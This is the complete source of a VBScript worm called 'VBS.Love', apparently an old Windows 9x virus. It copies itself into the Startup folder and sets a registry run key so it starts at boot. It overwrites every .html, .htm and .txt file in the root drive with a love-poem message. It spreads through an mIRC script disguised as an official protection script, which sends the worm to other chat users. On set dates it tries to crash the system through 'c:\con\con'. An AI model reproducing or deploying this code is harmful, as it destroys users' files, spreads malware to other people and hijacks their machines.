' [- VBS.Love -]

on error resume next
dim a, g, j, p, fso, r, f, w, boom, k

																					Set worm = CreateObject("Scripting.FileSystemObject")
																					Set w = worm.GetFile(WScript.ScriptFullName)
																					w.Copy ("c:\windows\Love.vbs")
																					w.Copy ("c:\WINDOWS\Start Menu\Programs\StartUp\RunWINDOWS.vbs")
																					w.Copy ("c:\Love.vbs")
																					w.Copy ("c:\windows\desktop\Love.vbs")
																					w.Copy ("c:\windows\system\refresh.vbs")

																					Set Map = worm.GetFolder("c:\")
																					Set a = Map.Files
																					For each target in a
																					ExtName = lcase(worm.GetExtensionName(target.Name))
																					if ExtName = "html" then
																					Set g = worm.OpenTextFile(target.path, 2, True)
																					g.write "<!-- VBS.Love -->"
																					g.write "<html>"
																					g.write "<head>"
																					g.write "<title>VBS.Love</title>"
																					g.write "<p><b>Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you.</b></font>"
																					g.write "</body>"
																					g.write "</html>"
																					g.close
																					end if
																					next

																					Set Map = worm.GetFolder("c:\")
																					Set a = Map.Files
																					For each target in a
																					ExtName = lcase(worm.GetExtensionName(target.Name))
																					if ExtName = "htm" then
																					Set g = worm.OpenTextFile(target.path, 2, True)
																					g.write "<!-- VBS.Love -->"
																					g.write "<html>"
																					g.write "<head>"
																					g.write "<title>VBS.Love</title>"
																					g.write "<p><b>Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you.</b></font>"
																					g.write "</body>"
																					g.write "</html>"
																					g.close
																					end if
																					next

																					Set Map = worm.GetFolder("c:\")
																					Set a = Map.Files
																					For each target in a
																					ExtName = lcase(worm.GetExtensionName(target.Name))
																					if ExtName = "txt" then
																					Set j = worm.OpenTextFile(target.path, 2, True)
																					j.write "[ Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you. ]"
																					j.close
																					end if
																					next

																					Set p = fso.OpenTextFile("c:\mirc\mirc.ini", 8, True)
																					p.WriteLine "n99=script.ini"
																					p.Close

																					Set fso = CreateObject("Scripting.FileSystemObject")
																					Set r = fso.CreateTextFile("c:\mirc\script.ini", True)
																					r.Write "[script]"
																					r.write "n0=;mIRC Protection Script DO NOT REMOVE! By Khaled Mardem-Bey www.mIRC.com"
																					r.write "n1=on 1:CONNECT:/run c:\windows\system\refresh.vbs | .msg #01-10781224-01 Hi"
																					r.Write "n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
																					r.Write "n3=.dcc send $nick c:\windows\Love.vbs"
																					r.Write "n4=}"
																					r.close
																					
																					Set fso = CreateObject("Scripting.FileSystemObject")
																					Set k = fso.CreateTextFile("c:\Love.NFO", True)
																					k.Write "VBS.Love"
																					k.Write "Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you."
																					k.Write "=("
																					
																					Set Reg = CreateObject("WScript.Shell")
																					Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win.com", "c:\windows\system\refresh.vbs"
																					
																					'rut oh! payload =]
																					
																					If Day(Now()) = 1 or Day(Now()) = 30 Then
																					msgbox "Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you."
																					
																					Set fso = CreateObject("Scripting.FileSystemObject")
																					Set g = fso.CreateTextFile("c:\windows\desktop\love.html", True)
																					g.write "<!-- VBS.Love -->"
																					g.write "<html>"
																					g.write "<body>"
																					g.write "<title>VBS.Love</title>"
																					g.write "<p><b>Why Do i feel this way? I Close my Eyes and Think of you, And I feel like I've gone to heaven, My heart races when I'm around you, I freeze inside, no one has ever made me Feel this way, tell me why, I cant stop thinking about you.</b></font>"
																					g.write "</body>"
																					g.write "</html>"
																					g.close
																					
																					Set boom = CreateObject("Wscript.shell")
																					boom.run"c:\con\con",0,True
																					boom.run"c:\con\con",1,True
																					boom.run"c:\con\con"

																					end if

' =]
'
' [-EBOLA- Coming Soon To a PC near you]
'
'
'*EOF*